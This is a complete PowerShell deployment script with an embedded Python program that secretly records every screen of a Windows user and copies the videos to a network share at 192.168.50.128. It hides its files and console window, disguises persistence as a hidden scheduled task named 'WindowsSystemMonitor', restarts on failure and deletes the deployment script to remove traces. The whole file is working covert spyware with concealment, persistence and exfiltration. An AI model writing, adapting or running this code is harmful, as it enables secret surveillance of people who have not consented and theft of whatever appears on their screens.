# ============================================================================
# STEALTH SCREEN RECORDER DEPLOYMENT SCRIPT
# ============================================================================
# This script will:
# 1. Install Python silently if not present
# 2. Install all dependencies
# 3. Deploy the recorder to a hidden location
# 4. Start recording in stealth mode (no visible window)
# 5. Create persistence via Task Scheduler
# 6. Self-destruct after successful deployment
# ============================================================================

$ErrorActionPreference = "Stop"

# === CONFIGURATION ===
$SERVER_IP = "192.168.50.128"
$SHARE_NAME = "Recordings"
$NETWORK_SHARE = "\\$SERVER_IP\$SHARE_NAME"
$INSTALL_DIR = "$env:LOCALAPPDATA\SystemMonitor"
$PYTHON_VERSION = "3.11.7"
$PYTHON_URL = "https://www.python.org/ftp/python/$PYTHON_VERSION/python-$PYTHON_VERSION-amd64.exe"
$TASK_NAME = "WindowsSystemMonitor"
$SCRIPT_PATH = $MyInvocation.MyCommand.Path

# === SHARE CREDENTIALS (Optional - leave empty for guest/current user access) ===
$SHARE_USERNAME = ""  # e.g., "admin" or "DOMAIN\user"
$SHARE_PASSWORD = ""  # Leave empty to use current user credentials

# === HELPER FUNCTIONS ===

function Write-Status {
    param([string]$Message, [string]$Type = "INFO")
    $color = switch ($Type) {
        "INFO"    { "Cyan" }
        "SUCCESS" { "Green" }
        "WARNING" { "Yellow" }
        "ERROR"   { "Red" }
        default   { "White" }
    }
    Write-Host "[$Type] $Message" -ForegroundColor $color
}

function Connect-NetworkShare {
    Write-Status "Connecting to network share: $NETWORK_SHARE"
    
    # First, try to disconnect any existing connection (clean slate)
    net use $NETWORK_SHARE /delete /y 2>&1 | Out-Null
    
    # Build the net use command
    if ($SHARE_USERNAME -and $SHARE_PASSWORD) {
        # Connect with explicit credentials
        $result = net use $NETWORK_SHARE /user:$SHARE_USERNAME $SHARE_PASSWORD /persistent:yes 2>&1
    } elseif ($SHARE_USERNAME) {
        # Username only (will prompt for password or use cached)
        $result = net use $NETWORK_SHARE /user:$SHARE_USERNAME /persistent:yes 2>&1
    } else {
        # Use current user credentials
        $result = net use $NETWORK_SHARE /persistent:yes 2>&1
    }
    
    if ($LASTEXITCODE -eq 0) {
        Write-Status "Connected to network share!" "SUCCESS"
        return $true
    } else {
        Write-Status "Could not connect to share (will cache locally): $result" "WARNING"
        return $false
    }
}

function Test-NetworkShare {
    # Quick test if share is accessible
    try {
        $testPath = "\\$SERVER_IP\$SHARE_NAME"
        if (Test-Path $testPath -ErrorAction SilentlyContinue) {
            return $true
        }
        # Try to list (sometimes Test-Path fails but access works)
        $null = Get-ChildItem $testPath -ErrorAction Stop | Select-Object -First 1
        return $true
    } catch {
        return $false
    }
}

function Test-PythonInstalled {
    try {
        $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
        if ($pythonPath) {
            $version = & python --version 2>&1
            Write-Status "Python found: $version at $pythonPath" "SUCCESS"
            return $true
        }
    } catch {}
    
    # Check common installation paths
    $commonPaths = @(
        "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe",
        "$env:LOCALAPPDATA\Programs\Python\Python310\python.exe",
        "$env:ProgramFiles\Python311\python.exe",
        "$env:ProgramFiles\Python310\python.exe",
        "C:\Python311\python.exe",
        "C:\Python310\python.exe"
    )
    
    foreach ($path in $commonPaths) {
        if (Test-Path $path) {
            Write-Status "Python found at: $path" "SUCCESS"
            # Add to PATH for this session
            $pythonDir = Split-Path $path -Parent
            $scriptsDir = Join-Path $pythonDir "Scripts"
            $env:PATH = "$pythonDir;$scriptsDir;$env:PATH"
            return $true
        }
    }
    
    return $false
}

function Install-Python {
    Write-Status "Python not found. Installing Python $PYTHON_VERSION..."
    
    $installerPath = "$env:TEMP\python_installer.exe"
    
    # Download Python installer
    Write-Status "Downloading Python installer..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $PYTHON_URL -OutFile $installerPath -UseBasicParsing
    } catch {
        Write-Status "Failed to download Python: $_" "ERROR"
        throw
    }
    
    # Install Python silently
    Write-Status "Installing Python silently (this may take a few minutes)..."
    $installArgs = @(
        "/quiet",
        "InstallAllUsers=0",
        "PrependPath=1",
        "Include_test=0",
        "Include_doc=0",
        "Include_launcher=1",
        "InstallLauncherAllUsers=0"
    )
    
    $process = Start-Process -FilePath $installerPath -ArgumentList $installArgs -Wait -PassThru -NoNewWindow
    
    if ($process.ExitCode -ne 0) {
        Write-Status "Python installation failed with exit code: $($process.ExitCode)" "ERROR"
        throw "Python installation failed"
    }
    
    # Clean up installer
    Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
    
    # Refresh PATH
    $pythonDir = "$env:LOCALAPPDATA\Programs\Python\Python311"
    $scriptsDir = "$pythonDir\Scripts"
    $env:PATH = "$pythonDir;$scriptsDir;$env:PATH"
    
    # Verify installation
    Start-Sleep -Seconds 2
    if (Test-PythonInstalled) {
        Write-Status "Python installed successfully!" "SUCCESS"
    } else {
        Write-Status "Python installation verification failed" "ERROR"
        throw "Python verification failed"
    }
}

function Install-Dependencies {
    Write-Status "Installing Python dependencies..."
    
    # Upgrade pip first
    & python -m pip install --upgrade pip --quiet 2>&1 | Out-Null
    
    # Install required packages
    $packages = @("dxcam", "opencv-python", "numpy")
    
    foreach ($pkg in $packages) {
        Write-Status "Installing $pkg..."
        & python -m pip install $pkg --quiet 2>&1 | Out-Null
        if ($LASTEXITCODE -ne 0) {
            Write-Status "Failed to install $pkg" "WARNING"
        }
    }
    
    Write-Status "Dependencies installed!" "SUCCESS"
}

function Deploy-Recorder {
    Write-Status "Deploying recorder to hidden location..."
    
    # Create hidden installation directory
    if (-not (Test-Path $INSTALL_DIR)) {
        New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null
    }
    
    # Set directory as hidden
    $folder = Get-Item $INSTALL_DIR -Force
    $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    # Create cache directory
    $cacheDir = Join-Path $INSTALL_DIR "cache"
    New-Item -ItemType Directory -Path $cacheDir -Force -ErrorAction SilentlyContinue | Out-Null

    # Write the recorder script
    $recorderScript = @'
"""
Enterprise Screen Recorder - Stealth Mode
"""

import dxcam
import cv2
import time
import ctypes
import ctypes.wintypes
import numpy as np
import signal
import sys
import os
import shutil
import threading
import queue
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Tuple
from dataclasses import dataclass
from enum import IntEnum


@dataclass
class RecorderConfig:
    employee_name: str = os.environ.get("USERNAME", "unknown_user")
    fps: float = 5.0
    motion_threshold: float = 0.5
    chunk_duration_seconds: int = 600
    cache_folder: Path = Path(os.environ.get("LOCALAPPDATA", ".")) / "SystemMonitor" / "cache"
    network_share: str = r"\\192.168.50.128\Recordings"
    upload_retry_interval: float = 30.0
    upload_check_interval: float = 5.0
    preferred_codec: str = "X264"
    fallback_codec: str = "XVID"
    
    @property
    def employee_network_path(self) -> Path:
        return Path(self.network_share) / self.employee_name
    
    @property
    def local_cache_path(self) -> Path:
        return self.cache_folder.resolve()


class SessionState(IntEnum):
    ACTIVE = 0
    LOCKED = 1
    UNKNOWN = 2


class SessionMonitor:
    def __init__(self):
        self._user32 = ctypes.windll.user32
        
    def is_session_locked(self) -> bool:
        hDesk = self._user32.OpenInputDesktop(0, False, 0x0001)
        if hDesk == 0:
            return True
        else:
            self._user32.CloseDesktop(hDesk)
            return False
    
    def get_session_state(self) -> SessionState:
        try:
            if self.is_session_locked():
                return SessionState.LOCKED
            return SessionState.ACTIVE
        except Exception:
            return SessionState.UNKNOWN


class UploadDaemon(threading.Thread):
    def __init__(self, config: RecorderConfig, logger: logging.Logger):
        super().__init__(daemon=True, name="UploadDaemon")
        self.config = config
        self.logger = logger
        self._stop_event = threading.Event()
        self._upload_queue: queue.Queue = queue.Queue()
        self._currently_recording: set = set()
        self._lock = threading.Lock()
        
    def stop(self):
        self._stop_event.set()
        
    def mark_file_recording(self, filepath: Path):
        with self._lock:
            self._currently_recording.add(str(filepath.resolve()))
            
    def mark_file_complete(self, filepath: Path):
        with self._lock:
            resolved = str(filepath.resolve())
            if resolved in self._currently_recording:
                self._currently_recording.discard(resolved)
            self._upload_queue.put(filepath)
    
    def _is_file_ready(self, filepath: Path) -> bool:
        with self._lock:
            return str(filepath.resolve()) not in self._currently_recording
    
    def _ensure_network_folder(self) -> bool:
        try:
            target_folder = self.config.employee_network_path
            target_folder.mkdir(parents=True, exist_ok=True)
            return True
        except Exception:
            return False
    
    def _upload_file(self, filepath: Path) -> bool:
        if not filepath.exists():
            return True
            
        try:
            target_folder = self.config.employee_network_path
            target_path = target_folder / filepath.name
            target_folder.mkdir(parents=True, exist_ok=True)
            shutil.copy2(filepath, target_path)
            
            if target_path.exists() and target_path.stat().st_size == filepath.stat().st_size:
                filepath.unlink()
                return True
            return False
                
        except Exception:
            return False
    
    def _scan_cache_folder(self) -> List[Path]:
        try:
            cache = self.config.local_cache_path
            if not cache.exists():
                return []
            files = [f for f in cache.glob("*.mkv") if self._is_file_ready(f)]
            files.sort(key=lambda x: x.stat().st_mtime)
            return files
        except Exception:
            return []
    
    def run(self):
        pending_files: List[Path] = []
        last_network_check = 0
        network_available = False
        
        while not self._stop_event.is_set():
            try:
                try:
                    while True:
                        priority_file = self._upload_queue.get_nowait()
                        if priority_file not in pending_files:
                            pending_files.insert(0, priority_file)
                except queue.Empty:
                    pass
                
                current_time = time.time()
                if current_time - last_network_check > self.config.upload_retry_interval:
                    scanned = self._scan_cache_folder()
                    for f in scanned:
                        if f not in pending_files:
                            pending_files.append(f)
                    last_network_check = current_time
                    network_available = self._ensure_network_folder()
                
                if network_available and pending_files:
                    filepath = pending_files[0]
                    if self._upload_file(filepath):
                        pending_files.pop(0)
                    else:
                        network_available = False
                        
            except Exception:
                pass
            
            self._stop_event.wait(self.config.upload_check_interval)
        
        for filepath in pending_files[:]:
            if self._upload_file(filepath):
                pending_files.remove(filepath)


class ChunkedVideoWriter:
    def __init__(self, config: RecorderConfig, monitor_index: int, frame_size: Tuple[int, int], 
                 upload_daemon: UploadDaemon, logger: logging.Logger):
        self.config = config
        self.monitor_index = monitor_index
        self.frame_size = frame_size
        self.upload_daemon = upload_daemon
        self.logger = logger
        
        self._current_writer: Optional[cv2.VideoWriter] = None
        self._current_filepath: Optional[Path] = None
        self._chunk_start_time: float = 0
        self._chunk_start_epoch: int = 0
        self._frame_count: int = 0
        self._fourcc = self._get_fourcc()
        
        self.config.local_cache_path.mkdir(parents=True, exist_ok=True)
        
    def _get_fourcc(self) -> int:
        try:
            return cv2.VideoWriter_fourcc(*self.config.preferred_codec)
        except:
            return cv2.VideoWriter_fourcc(*self.config.fallback_codec)
    
    def _generate_filename(self, start_epoch: int, end_epoch: int) -> str:
        return f"rec_{self.config.employee_name}_{start_epoch}_{end_epoch}_mon{self.monitor_index}.mkv"
    
    def _start_new_chunk(self):
        self._chunk_start_time = time.time()
        self._chunk_start_epoch = int(self._chunk_start_time)
        self._frame_count = 0
        
        temp_name = f"recording_{self.config.employee_name}_{self._chunk_start_epoch}_mon{self.monitor_index}.mkv"
        self._current_filepath = self.config.local_cache_path / temp_name
        
        width, height = self.frame_size
        self._current_writer = cv2.VideoWriter(
            str(self._current_filepath), self._fourcc, self.config.fps, (width, height)
        )
        
        if self._current_writer.isOpened():
            self.upload_daemon.mark_file_recording(self._current_filepath)
    
    def _finalize_current_chunk(self) -> Optional[Path]:
        if self._current_writer is None:
            return None
            
        old_path = self._current_filepath
        self._current_writer.release()
        self._current_writer = None
        
        if old_path is None or not old_path.exists():
            return None
        
        end_epoch = int(time.time())
        final_name = self._generate_filename(self._chunk_start_epoch, end_epoch)
        final_path = self.config.local_cache_path / final_name
        
        try:
            old_path.rename(final_path)
            self.upload_daemon.mark_file_complete(final_path)
            return final_path
        except Exception:
            self.upload_daemon.mark_file_complete(old_path)
            return old_path
    
    def write_frame(self, frame: np.ndarray) -> Optional[Path]:
        current_time = time.time()
        finalized_path = None
        
        if self._current_writer is None:
            self._start_new_chunk()
        elif current_time - self._chunk_start_time >= self.config.chunk_duration_seconds:
            finalized_path = self._finalize_current_chunk()
            self._start_new_chunk()
        
        if self._current_writer is not None:
            self._current_writer.write(frame)
            self._frame_count += 1
        
        return finalized_path
    
    def close(self) -> Optional[Path]:
        return self._finalize_current_chunk()


class EnterpriseRecorder:
    def __init__(self, config: Optional[RecorderConfig] = None):
        self.config = config or RecorderConfig()
        self._setup_logging()
        
        self._should_stop = False
        self._is_recording = False
        self._session_monitor = SessionMonitor()
        self._upload_daemon: Optional[UploadDaemon] = None
        self._cameras: List = []
        self._writers: List[ChunkedVideoWriter] = []
        self._last_frames: List[Optional[np.ndarray]] = []
        
    def _setup_logging(self):
        self.logger = logging.getLogger("Recorder")
        self.logger.setLevel(logging.WARNING)
        
        log_file = self.config.local_cache_path / "service.log"
        self.config.local_cache_path.mkdir(parents=True, exist_ok=True)
        
        if not self.logger.handlers:
            file_handler = logging.FileHandler(log_file)
            file_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
            self.logger.addHandler(file_handler)
    
    def _get_monitor_count(self) -> int:
        user32 = ctypes.windll.user32
        user32.SetProcessDPIAware()
        return user32.GetSystemMetrics(80)
    
    def _signal_handler(self, signum, frame):
        self._should_stop = True
    
    def _setup_signals(self):
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)
        if hasattr(signal, 'SIGBREAK'):
            signal.signal(signal.SIGBREAK, self._signal_handler)
    
    def _detect_motion(self, current_frame: np.ndarray, previous_frame: Optional[np.ndarray]) -> bool:
        if previous_frame is None:
            return True
        
        curr_gray = cv2.cvtColor(current_frame, cv2.COLOR_BGR2GRAY)
        prev_gray = cv2.cvtColor(previous_frame, cv2.COLOR_BGR2GRAY)
        diff = cv2.absdiff(curr_gray, prev_gray)
        _, thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)
        
        changed_pixels = np.count_nonzero(thresh)
        total_pixels = current_frame.shape[0] * current_frame.shape[1]
        change_percent = (changed_pixels / total_pixels) * 100
        
        return change_percent > self.config.motion_threshold
    
    def _initialize_cameras(self) -> bool:
        num_monitors = self._get_monitor_count()
        
        self._cameras = []
        self._writers = []
        self._last_frames = []
        
        for i in range(num_monitors):
            try:
                cam = dxcam.create(output_idx=i, output_color="BGR")
                frame = cam.grab()
                if frame is None:
                    continue
                
                height, width, _ = frame.shape
                
                writer = ChunkedVideoWriter(
                    config=self.config, monitor_index=i, frame_size=(width, height),
                    upload_daemon=self._upload_daemon, logger=self.logger,
                )
                
                cam.start(target_fps=int(self.config.fps), video_mode=True)
                
                self._cameras.append(cam)
                self._writers.append(writer)
                self._last_frames.append(None)
                
            except Exception:
                pass
        
        return len(self._cameras) > 0
    
    def _cleanup_cameras(self):
        for writer in self._writers:
            try:
                writer.close()
            except Exception:
                pass
        
        for cam in self._cameras:
            try:
                cam.stop()
            except Exception:
                pass
        
        self._cameras = []
        self._writers = []
        self._last_frames = []
    
    def _recording_loop(self):
        check_interval = 1.0 / self.config.fps
        
        while not self._should_stop:
            loop_start = time.time()
            
            if self._session_monitor.is_session_locked():
                return
            
            for i, cam in enumerate(self._cameras):
                try:
                    frame = cam.get_latest_frame()
                    if frame is None:
                        continue
                    
                    if self._detect_motion(frame, self._last_frames[i]):
                        self._writers[i].write_frame(frame)
                        self._last_frames[i] = frame.copy()
                    
                except Exception:
                    pass
            
            elapsed = time.time() - loop_start
            if elapsed < check_interval:
                time.sleep(check_interval - elapsed)
    
    def run(self):
        self._should_stop = False
        self._setup_signals()
        
        self.config.local_cache_path.mkdir(parents=True, exist_ok=True)
        
        self._upload_daemon = UploadDaemon(self.config, self.logger)
        self._upload_daemon.start()
        
        try:
            while not self._should_stop:
                if self._session_monitor.is_session_locked():
                    while self._session_monitor.is_session_locked() and not self._should_stop:
                        time.sleep(1.0)
                    
                    if self._should_stop:
                        break
                
                if not self._initialize_cameras():
                    time.sleep(5)
                    continue
                
                self._is_recording = True
                
                try:
                    self._recording_loop()
                finally:
                    self._is_recording = False
                    self._cleanup_cameras()
                    
        except Exception:
            pass
        finally:
            if self._is_recording:
                self._cleanup_cameras()
            
            if self._upload_daemon:
                self._upload_daemon.stop()
                self._upload_daemon.join(timeout=30)


if __name__ == "__main__":
    # Hide console window
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    recorder = EnterpriseRecorder()
    recorder.run()
'@

    $recorderPath = Join-Path $INSTALL_DIR "monitor.pyw"
    Set-Content -Path $recorderPath -Value $recorderScript -Encoding UTF8
    
    # Set file as hidden
    $file = Get-Item $recorderPath -Force
    $file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden
    
    Write-Status "Recorder deployed to: $recorderPath" "SUCCESS"
    return $recorderPath
}

function Create-StealthTask {
    param([string]$RecorderPath)
    
    Write-Status "Creating stealth startup task..."
    
    # Get Python path
    $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
    if (-not $pythonPath) {
        $pythonPath = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"
    } else {
        # Use pythonw.exe for no console window
        $pythonPath = $pythonPath -replace "python\.exe$", "pythonw.exe"
    }
    
    # Remove existing task if present
    schtasks /delete /tn $TASK_NAME /f 2>&1 | Out-Null
    
    # Create task XML for maximum stealth
    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows System Monitor Service</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>"$pythonPath"</Command>
      <Arguments>"$RecorderPath"</Arguments>
      <WorkingDirectory>$INSTALL_DIR</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@

    $taskXmlPath = "$env:TEMP\task.xml"
    Set-Content -Path $taskXmlPath -Value $taskXml -Encoding Unicode
    
    # Register the task
    $result = schtasks /create /tn $TASK_NAME /xml $taskXmlPath /f 2>&1
    
    Remove-Item $taskXmlPath -Force -ErrorAction SilentlyContinue
    
    if ($LASTEXITCODE -eq 0) {
        Write-Status "Startup task created successfully!" "SUCCESS"
    } else {
        Write-Status "Task creation warning: $result" "WARNING"
    }
}

function Start-RecorderNow {
    param([string]$RecorderPath)
    
    Write-Status "Starting recorder in stealth mode..."
    
    # Get pythonw.exe path (no console)
    $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
    if ($pythonPath) {
        $pythonwPath = $pythonPath -replace "python\.exe$", "pythonw.exe"
    } else {
        $pythonwPath = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"
    }
    
    # Start the process hidden
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $pythonwPath
    $startInfo.Arguments = "`"$RecorderPath`""
    $startInfo.WorkingDirectory = $INSTALL_DIR
    $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $startInfo.CreateNoWindow = $true
    $startInfo.UseShellExecute = $false
    
    try {
        $process = [System.Diagnostics.Process]::Start($startInfo)
        Write-Status "Recorder started (PID: $($process.Id))" "SUCCESS"
        return $true
    } catch {
        # Fallback: use task scheduler to start
        schtasks /run /tn $TASK_NAME 2>&1 | Out-Null
        Write-Status "Recorder started via task scheduler" "SUCCESS"
        return $true
    }
}

function Self-Destruct {
    Write-Status "Cleaning up deployment traces..."
    
    # Schedule self-deletion
    $selfPath = $SCRIPT_PATH
    if ($selfPath -and (Test-Path $selfPath)) {
        $deleteCmd = "Start-Sleep -Seconds 3; Remove-Item -Path '$selfPath' -Force -ErrorAction SilentlyContinue"
        Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command `"$deleteCmd`"" -WindowStyle Hidden
        Write-Status "Deployment script will self-destruct" "SUCCESS"
    }
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

try {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Magenta
    Write-Host "   STEALTH DEPLOYMENT IN PROGRESS" -ForegroundColor Magenta
    Write-Host "============================================" -ForegroundColor Magenta
    Write-Host ""
    
    # Step 1: Connect to network share
    Write-Status "Step 1/6: Connecting to network share..."
    $networkConnected = Connect-NetworkShare
    if (-not $networkConnected) {
        Write-Status "Network not available now - recordings will cache locally and sync later" "WARNING"
    }
    
    # Step 2: Check/Install Python
    Write-Status "Step 2/6: Checking Python installation..."
    if (-not (Test-PythonInstalled)) {
        Install-Python
    }
    
    # Step 3: Install dependencies
    Write-Status "Step 3/6: Installing dependencies..."
    Install-Dependencies
    
    # Step 4: Deploy recorder
    Write-Status "Step 4/6: Deploying recorder..."
    $recorderPath = Deploy-Recorder
    
    # Step 5: Create persistence
    Write-Status "Step 5/6: Creating persistence..."
    Create-StealthTask -RecorderPath $recorderPath
    
    # Step 6: Start recorder
    Write-Status "Step 6/6: Starting recorder..."
    $started = Start-RecorderNow -RecorderPath $recorderPath
    
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Green
    Write-Host "   DEPLOYMENT SUCCESSFUL!" -ForegroundColor Green
    Write-Host "============================================" -ForegroundColor Green
    Write-Host ""
    Write-Status "Target server: $NETWORK_SHARE" "INFO"
    Write-Status "Local cache: $INSTALL_DIR\cache" "INFO"
    Write-Host ""
    Write-Status "Window will close in 10 seconds..." "INFO"
    
    # Self-destruct
    Self-Destruct
    
    # Wait 10 seconds then close
    Start-Sleep -Seconds 10
    
} catch {
    Write-Host ""
    Write-Host "============================================" -ForegroundColor Red
    Write-Host "   DEPLOYMENT FAILED!" -ForegroundColor Red
    Write-Host "============================================" -ForegroundColor Red
    Write-Host ""
    Write-Status "Error: $_" "ERROR"
    Write-Host ""
    Write-Host "Press any key to exit..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

